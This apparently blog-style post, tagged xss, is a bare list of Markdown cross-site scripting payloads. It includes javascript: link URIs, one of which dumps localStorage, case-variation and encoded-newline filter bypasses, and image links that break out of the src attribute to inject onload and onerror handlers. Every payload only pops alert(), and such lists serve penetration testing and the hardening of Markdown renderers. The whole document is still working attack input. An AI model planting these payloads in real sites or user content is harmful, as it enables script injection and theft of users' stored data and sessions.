---
title: Markdown XSS Payload
date: 2019-03-12 13:43:40
tags: "xss"
---

[Basic](javascript:alert('Basic'))


[Local Storage](javascript:alert(JSON.stringify(localStorage)))


[CaseInsensitive](JaVaScRiPt:alert('CaseInsensitive'))

[URL](javascript://www.google.com%0Aalert('URL'))

[In Quotes]('javascript:alert("InQuotes")')

![Escape SRC - onload](https://www.example.com/image.png"onload="alert('ImageOnLoad'))

![Escape SRC - onerror]("onerror="alert('ImageOnError'))